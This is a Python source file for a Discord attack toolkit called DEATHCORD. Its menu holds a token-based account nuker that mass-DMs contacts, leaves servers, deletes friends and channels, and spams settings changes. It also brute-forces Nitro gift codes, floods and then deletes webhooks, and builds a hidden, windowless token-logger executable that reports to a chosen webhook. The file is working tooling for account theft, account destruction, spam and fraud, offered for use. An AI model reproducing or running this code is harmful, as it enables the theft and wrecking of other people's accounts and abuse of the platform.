import os

import msvcrt as m

import sys

import pyfade

import shutil

import subprocess

import ctypes

import time

import datetime

import random

import string

import threading

import discord

import requests

import ctypes

import json

import platform

from threading import Thread

from tkinter import *

from tkinter import filedialog

from time import sleep

from itertools import cycle

from dhooks import Webhook

from colorama import Fore, init

from colored import fg, attr

from slowprint.slowprint import slowprint

from selenium import webdriver

from selenium.webdriver.common.keys import Keys




os.system('cls')


ctypes.windll.kernel32.SetConsoleTitleW(
    f"Made by CHIKI")


print("""
 \033[35m
                     █▀▄ █▀▀ ▄▀█ ▀█▀ █░█ █▀▀ █▀█ █▀█ █▀▄
                     █▄▀ ██▄ █▀█ ░█░ █▀█ █▄▄ █▄█ █▀▄ █▄▀
                               MADE BY CHIKI 
         ╔═════════════╦═════════════════════╦══════════════════════╗
         ║ [1]  LOGIN  ║ [2]  TOKEN NUKER    ║ [3]  NITRO GENERATOR ║
         ╠═════════════╬═════════════════════╬══════════════════════╣
         ║ [4]  Exit   ║ [5]  WEBHOOK FUCKER ║ [6]  TOKEN LOGGER    ║
         ╚═════════════╩═════════════════════╩══════════════════════╝
""")


choose = input(' \n CHOOSE : ')

if choose == '1':
    os.system('cls')
    print("""
    \033[35m
    █░░ █▀█ █▀▀ █ █▄░█
    █▄▄ █▄█ █▄█ █ █░▀█
    """)
    token = input('\nINSERT YOUR TOKEN :  ')
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    driver = webdriver.Chrome('chromedriver.exe')
    driver.get('https://discord.com/login')
    js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
    driver.execute_script(js + f'login("{token}")')

elif choose == '2':
    os.system('cls')
    date = datetime.datetime.now()
    ok = date.strftime("%H:%M:%S")

    GUILDIDS = []
    FRIENDIDS = []
    PRIVATEIDS = []


    def close():
        os._exit(0)


    def clear():
        if sys.platform.startswith("win"):
            os.system('cls')
        elif sys.platform == 'linux' or 'darwin':
            os.system('clear')


    class colors:

        red = fg('#572991')
        reset = attr('reset')
        gray = fg('#8D8C8C')


    token = input(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} TOKEN :  {colors.red}: {colors.reset}")

    client = discord.Client()


    def run():
        date = datetime.datetime.now()
        ok = date.strftime("%H:%M:%S")
        try:
            client.run(token, bot=False, reconnect=True)
        except:
            print(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} !INVAILD TOKEN!')
            time.sleep(3)


    class LIE:

        @staticmethod
        def ratelimit(status: int, body: str):  # cba ill use this sometime
            try:
                if status == 429:
                    date = datetime.datetime.now()
                    ok = date.strftime("%H:%M:%S")
                    data = json.load(body)
                    print(
                        f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Ratelimited Sleeping For {colors.red}{data["retry_after"]}{colors.reset}')
                    time.sleep(data["retry_after"])
                    pass
            except:
                pass


    def splash():
        logo = (f"""{colors.reset}
                                                        █▄░█ █░█ █▄▀ █▀▀ █▀█
                                                        █░▀█ █▄█ █░█ ██▄ █▀▄
        """).replace('█', f"{colors.red}█{colors.reset}").replace("═", f'{colors.reset}═{colors.reset}').replace("║",
                                                                                                                 f'{colors.reset}║{colors.reset}').replace(
            "╔", f"{colors.reset}╔{colors.reset}").replace("╝", f"{colors.reset}╝{colors.reset}").replace("╚",
                                                                                                          f"{colors.reset}╚{colors.reset}").replace(
            "╗", f"{colors.reset}╗{colors.reset}")
        return logo


    def dmall():
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        try:
            sm = input(
                f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} MESSAGE TO DMALL{colors.red}: {colors.reset}")
            for id in PRIVATEIDS:
                try:
                    requests.post(
                        f'https://discord.com/api/v8/channels/{id}/messages',
                        headers=headers,
                        data={"content": f"{sm}"})

                    print(
                        f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} JUST DMED {colors.red}{id}{colors.reset}"
                    )
                except:
                    print(
                        f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} CANT DM {colors.red}{id}{colors.reset}"
                    )
        except:
            pass
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def leave_guilds(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        for id in GUILDIDS:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/{id}',
                headers=headers)
            print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} LEFT {colors.red}{id}{colors.reset}")
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def remove_friends(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        try:
            for friend in FRIENDIDS:
                try:
                    r = requests.delete(
                        f'https://discord.com/api/v8/users/@me/relationships/{friend}',
                        headers=headers)
                    print(
                        f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} UNFRIENDED {colors.red}{friend}{colors.reset}")
                except:
                    print(
                        f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} COULDNT UNFRIENDED {colors.red}{friend}{colors.reset}")
                LIE.ratelimit(status=r.status_code, body=r.json())
        except:
            pass
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def remove_private_channels(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        for id in PRIVATEIDS:
            try:
                r = requests.delete(
                    f'https://discord.com/api/v8/channels/{id}',
                    headers=headers
                )
                print(
                    f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} DELETED PRIVATE CHANNEL {colors.red}{id}{colors.reset}")
            except:
                print(
                    f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} DIDNT DELETE PRIVATE CHANNEL {colors.red}{id}{colors.reset}")
            LIE.ratelimit(status=r.status_code, body=r.json())
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def modes(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        mod = cycle(["light", "dark"])
        try:
            while True:
                settings = {
                    'theme': next(mod)
                }
                r = requests.patch(
                    'https://discord.com/api/v8/users/@me/settings',
                    headers=headers,
                    json=settings
                )
                LIE.ratelimit(status=r.status_code, body=r.json())
        except:
            pass
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def langs(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        locales = [
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
        ]
        setting = {
            'locale': random.choice(locales)
        }
        while True:
            try:
                r = requests.patch(
                    'https://discord.com/api/v8/users/@me/settings',
                    headers=headers,
                    json=setting
                )
            except:
                pass
            LIE.ratelimit(status=r.status_code, body=r.json())
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def create_guilds(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        namez = input(
            f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD NAMES{colors.red}: {colors.reset}')
        guilicon = input(
            f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD ICON(MUST BE A URL) or None{colors.red}: {colors.reset}')
        amount = input(
            f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD AMOUNT{colors.red}: {colors.reset}')
        if guilicon == 'None':
            payload = {
                'name': namez,
                'region': 'europe',
                'icon': None,
                'channels': None
            }
        elif guilicon.startswith('https://'):
            payload = {
                'name': namez,
                'region': 'europe',
                'icon': f'{guilicon}',
                'channels': None
            }
        else:
            payload = {
                'name': namez,
                'region': 'europe',
                'icon': None,
                'channels': None
            }
        for i in range(int(amount)):
            try:
                r = requests.post('https://discord.com/api/v6/guilds',
                                  headers=headers,
                                  json=payload)
                print(
                    f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} CREATED {colors.red}{namez}{colors.reset} ({colors.red}{i}{colors.reset})")
            except:
                pass
            LIE.ratelimit(status=r.status_code, body=r.json())
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def status_change():
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
        status = input(
            f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} STATUS TO CHANGE TO{colors.red}: {colors.reset}')
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            payload = {
                'message_display_compact': True,
                'inline_embed_media': False,
                'inline_attachment_media': False,
                'gif_auto_play': False,
                'render_embeds': False,
                'render_reactions': False,
                'animate_emoji': False,
                'convert_emoticons': False,
                'enable_tts_command': False,
                'explicit_content_filter': '0',
                'status': next(statuses),
                'custom_status': status
            }
            r = requests.patch(
                'https://discord.com/api/v8/users/@me/settings',
                headers=headers,
                json=payload
            )
            LIE.ratelimit(status=r.status_code, body=r.json())
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()


    def lie():
        clear()
        print(splash())
        m = ('''

                                    ╔═════════════╦═════════════════════╦══════════════════════╗
                                    ║ [1]  DM ALL ║ [2]  Leave Servers  ║ [3]  Create Servers  ║
                                    ╠═════════════╬═════════════════════╬══════════════════════╣
                                    ║ [4]  Status ║ [5]  Lang Change    ║ [6]   Light & Dark   ║
                                    ╠═════════════╬═════════════════════╬══════════════════════╣
                                    ║ [7]  Exit   ║ [8]  Remove Friends ║ [9]  Delete Channels ║
                                    ╚═════════════╩═════════════════════╩══════════════════════╝


        ''').replace("[", f"{colors.red}[{colors.reset}").replace("]", f"{colors.red}]{colors.reset}")
        print(m)
        choice = input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Choice{colors.red}:{colors.reset} ')
        if choice == '1':
            dmall()
        elif choice == '2':
            leave_guilds(token)
        elif choice == '3':
            create_guilds(token)
        elif choice == '4':
            status_change()
        elif choice == '5':
            langs(token)
        elif choice == '6':
            modes(token)
        elif choice == '7':
            close()
        elif choice == '8':
            remove_friends(token)
        elif choice == '9':
            remove_private_channels(token)
        elif choice.isdigit() == False:
            lie()
        else:
            lie()


    @client.event
    async def on_connect():
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'[MULTI TOOL ACCOUNT NUKER] | Connected => {client.user.name}#{client.user.discriminator}')
        for g in client.guilds:
            GUILDIDS.append(g.id)
        for c in client.private_channels:
            PRIVATEIDS.append(c.id)
        for f in client.user.friends:
            FRIENDIDS.append(f.id)
        await lie()


    if __name__ == '__main__':
        run()

elif choose == '3':
    time.sleep(3)
   
    os.system('cls' if os.name == 'nt' else 'clear')



    try:

        from discord_webhook import DiscordWebhook

    except ImportError:

        input(

            f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit")  # Tell the user it has not been installed and how to install it

        exit()

    try:
        import requests

    except ImportError:

        input(

            f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")  # Tell the user it has not been installed and how to install it

        exit()





    class NitroGen:

        def __init__(self):
            self.fileName = "Nitro Codes.txt"



        def main(self):

            os.system('cls' if os.name == 'nt' else 'clear')

            if os.name == "nt":

                print("")

                ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker")

            else:

                print(f'\33]0;Nitro Generator and Checker\a', end='', flush=True)



            print("""

            \033[35m
    █▄░█ █ ▀█▀ █▀█ █▀█   █▀▀ █▀▀ █▄░█ █▀▀ █▀█ ▄▀█ ▀█▀ █▀█ █▀█
    █░▀█ █ ░█░ █▀▄ █▄█   █▄█ ██▄ █░▀█ ██▄ █▀▄ █▀█ ░█░ █▄█ █▀▄

             """)
 
            time.sleep(2)
            self.slowType("GENERATING STARTING FROM NOW \n \n", .02)
 
            time.sleep(1)



            num = int(

                '100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')



            url = (
                '')

            webhook = url if url != "" else None



            valid = []

            invalid = 0



            for i in range(num):

                try:
                    code = "".join(random.choices(

                        string.ascii_uppercase + string.digits + string.ascii_lowercase,

                        k=16

                    ))

                    url = f"https://discord.gift/{code}"



                    result = self.quickChecker(url, webhook)



                    if result:

                        valid.append(url)

                    else:

                        invalid += 1

                except Exception as e:
                    print(f" Error | {url} ")



                if os.name == "nt":

                    ctypes.windll.kernel32.SetConsoleTitleW(

                        f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid")

                    print("")

                else:

                    print(

                        f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid \a',

                        end='', flush=True)


            print(f"""

    Results:

     Valid: {len(valid)}

     Invalid: {invalid}

     Valid Codes: {', '.join(valid)}""")



            input("\nThe end! Press Enter 5 times to close the program.")

            [input(i) for i in range(4, 0, -1)]



        def slowType(self, text, speed, newLine=True):  # Function used to print text a little more fancier
            for i in text:  # Loop over the message

                print(i, end="", flush=True)  # Print the one charecter, flush is used to force python to print the char

                time.sleep(speed)  # Sleep a little before the next one

            if newLine:  # Check if the newLine argument is set to True

                print()  # Print a final newline to make it act more like a normal print statement



        def generator(self, amount):  # Function used to generate and store nitro codes in a seperate file

            with open(self.fileName, "w", encoding="utf-8") as file:  # Load up the file in write mode
                print("Wait, Generating for you")  # Let the user know the code is generating the codes




                start = time.time()  # Note the initaliseation time




                for i in range(amount):  # Loop the amount of codes to generate

                    code = "".join(random.choices(

                        string.ascii_uppercase + string.digits + string.ascii_lowercase,
                        k=16

                    ))  # Generate the code id


                    file.write(f"https://discord.gift/{code}\n")  # Write the code




                # Tell the user its done generating and how long tome it took

                print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n")  #




        def fileChecker(self, notify=None):  # Function used to check nitro codes from a file


            valid = []  # A list of the valid codes

            invalid = 0  # The amount of invalid codes detected


            with open(self.fileName, "r", encoding="utf-8") as file:  # Open the file containing the nitro codes

                for line in file.readlines():  # Loop over each line in the file

                    nitro = line.strip("\n")  # Remove the newline at the end of the nitro code




                    # Create the requests url for later use
                    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"




                    response = requests.get(url)  # Get the responce from the url


                    if response.status_code == 200:  # If the responce went through


                        print(f" Valid | {nitro} ")  # Notify the user the code was valid


                        valid.append(nitro)  # Append the nitro code the the list of valid codes




                        if notify is not None:  # If a webhook has been added


                            DiscordWebhook(


                                # Send the message to discord letting the user know there has been a valid nitro code

                                url=notify,


                                content=f"Valid Nito Code detected! @everyone \n{nitro}"

                            ).execute()

                        else:  # If there has not been a discord webhook setup just stop the code


                            break  # Stop the loop since a valid code was found




                    else:  # If the responce got ignored or is invalid ( such as a 404 or 405 )

                        print(f" Invalid | {nitro} ")  # Tell the user it tested a code and it was invalid

                        invalid += 1  # Increase the invalid counter by one




            return {"valid": valid, "invalid": invalid}  # Return a report of the results




        def quickChecker(self, nitro, notify=None):  # Used to check a single code at a time

            # Generate the request url

            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)  # Get the response from discord


            if response.status_code == 200:  # If the responce went through


                print(f" Valid | {nitro} ", flush=True,

                      end="" if os.name == 'nt' else "\n")  # Notify the user the code was valid

                with open("Nitro Codes.txt", "w") as file:  # Open file to write


                    file.write(nitro)  # Write the nitro code to the file it will automatically add a newline




                if notify is not None:  # If a webhook has been added

                    DiscordWebhook(


                        # Send the message to discord letting the user know there has been a valid nitro code

                        url=notify,

                        content=f"Valid Nito Code detected! @everyone \n{nitro}"

                    ).execute()





                return True  # Tell the main function the code was found




            else:  # If the responce got ignored or is invalid ( such as a 404 or 405 )

                print(f" Invalid | {nitro} ", flush=True,
                      end="" if os.name == 'nt' else "\n")  

                return False  



    if __name__ == '__main__':
        Gen = NitroGen()  
        Gen.main()  

elif choose == '4':
    os.system('cls')
    input("Press Enter To Exit")
    slowprint('EXIT IN 3',0.3)
    time.sleep(1)
    slowprint('EXIT IN 2',0.3)
    time.sleep(1)
    slowprint('EXIT IN 1',0.3)
    time.sleep(1)

elif choose == '5':
    
    os.system('cls')
    
    print("""
    \033[35m

        █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀   █▀▀ █░█ █▀▀ █▄▀ █▀▀ █▀█
        ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█   █▀░ █▄█ █▄▄ █░█ ██▄ █▀▄
    """)

    
    
    
    

    print("""
                 DEATHCORD WEBHOOK FUCKER
    """)

    
    
    nameeee = input('Username : ')
    
    tedaddd = input('Amount : ')
    
    def nuke():
    
        start = input("WEBHOOK : ")
    
        mes = " [You've been spammed by " + nameeee + "] \n[@everyone] \n [@here] \n \n 𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫𒐫\n𒐫𒐫𒐫\n"
    
        nu = tedaddd
    
        nu = int(nu)
    
        hook = Webhook(start)
    


        for i in range(nu): 
    


            hook.send(''+mes+'\n' * 100)
    







        x = requests.delete(start)
    
    
    
    
    
    def end():
    
    
        print("\nSUCCESSFULLY NUKED\n")
    
        print("Closing in 1")
    
        time.sleep(1)
    
        os.system("exit")
    
    
    nuke()
    
    end()

elif choose == '6':
    os.system('cls')
    USE_ICON = False
    WEBHOOKKK = None
    ICON_PATH = None

    texxtt = """
    \033[35m
           ▀█▀ █▀█ █▄▀ █▀▀ █▄░█   █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
           ░█░ █▄█ █░█ ██▄ █░▀█   █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄
        """
    print(texxtt)

    while True:
        WEBHOOKKK = input('ENTER THE WEBHOOK : ')
        if len(WEBHOOKKK) > 5:
            break
        else:
            continue

    print('Would you like to use a custom icon (y/n)?')

    while True:
        use_icon = input(': ')
        if use_icon.lower() == 'y':
            USE_ICON = True
            window = Tk()
            window.withdraw()
            ICON_PATH = filedialog.askopenfilename()
            break
        elif use_icon.lower() == 'n':
            USE_ICON = False
            break
        else:
            continue

    print('BUILDING PLS WAIT 1/4')

    with open('temp/logger.py', 'r') as file:
        content = file.read()
        file.close()
    new_content = content[:139] + '"' + WEBHOOKKK + '"' + content[143:]
    with open('output/token_logger.py', 'w') as file:
        file.write(new_content)
        file.close()

    print('BUILDING PLS WAIT 2/4')
    print('BUILDING PLS WAIT 3/4')

    if USE_ICON is False:
        subprocess.getoutput('pyinstaller output/token_logger.py --onefile -w')
    elif USE_ICON is True:
        subprocess.getoutput(f'pyinstaller output/token_logger.py --onefile -w --icon {ICON_PATH}')

    print('4/4 SUCCESSFULLY BUILDED')
    print('PLS WAIT')

    shutil.rmtree('build')
    os.remove('token_logger.spec')
    shutil.move('dist/token_logger.exe', 'output')
    shutil.rmtree('dist')
    shutil.rmtree('output/__pycache__')

    print('1/2')
    print('2/2')
    print('LEAVING IN 5')

    sleep(5)

elif choose == '69':
    os.system('cls')
    print("""
     \033[35m
    █▀▀ ▄▀█ █▀ ▀█▀ █▀▀ █▀█   █▀▀ █▀▀ █▀▀
    ██▄ █▀█ ▄█ ░█░ ██▄ █▀▄   ██▄ █▄█ █▄█
    """)
    time.sleep(1)
    slowprint('YOU FOUND A 1/3 EASTER EGG \n Press Enter To See The Easter Egg ( ಠ ͜ʖ ಠ )', 0.8)
    input('')
    slowprint('---3---',0.5)
    time.sleep(1)
    slowprint('---2---',0.5)
    time.sleep(1)
    slowprint('---1---',0.5)
    time.sleep(1)
    slowprint('ARE YOU SURE ? ( ͡° ͜ʖ ͡°(y,n)  ͡° ͜ʖ ͡°)  ',1)
    YYY = input(':')
    print(YYY)
    if YYY == 'y':
        os.system('cls')
        slowprint("""
                  
        █▓▒▓█▀██▀█▄░░▄█▀██▀█▓▒▓█
        █▓▒░▀▄▄▄▄▄█░░█▄▄▄▄▄▀░▒▓█
        █▓▓▒░░░░░▒▓░░▓▒░░░░░▒▓▓█
      be chi negah mikoni kos kesh
        """,0.5)
        time.sleep(8)
    elif YYY == 'n':
        slowprint('kos kesh',0.4)
        time.sleep(2)
    else:
        print('haji namosan kamtar bezan')
        time.sleep(3)
        

else:

    print('some thing is wrong !')

